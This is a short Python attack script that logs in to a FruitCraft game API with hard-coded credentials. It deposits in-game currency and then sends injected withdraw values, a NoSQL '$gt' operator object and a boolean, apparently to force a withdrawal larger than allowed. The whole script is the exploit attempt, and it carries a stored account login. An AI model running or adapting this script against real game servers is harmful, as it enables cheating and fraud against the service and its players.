import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    print("Testing Bank Force Max Withdraw...")
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    print("\n[+] Testing withdraw JSON string injection with object")
    c1.post("/player/deposittobank", {"deposit": 100})
    time.sleep(2)
    res = c1.post("/player/withdrawfrombank", {"withdraw": {"$gt": 0}})
    print("Withdraw Object:", res)

    time.sleep(2)
    c1.post("/player/deposittobank", {"deposit": 100})
    time.sleep(2)
    res = c1.post("/player/withdrawfrombank", {"withdraw": True})
    print("Withdraw Bool True:", res)

if __name__ == "__main__":
    main()
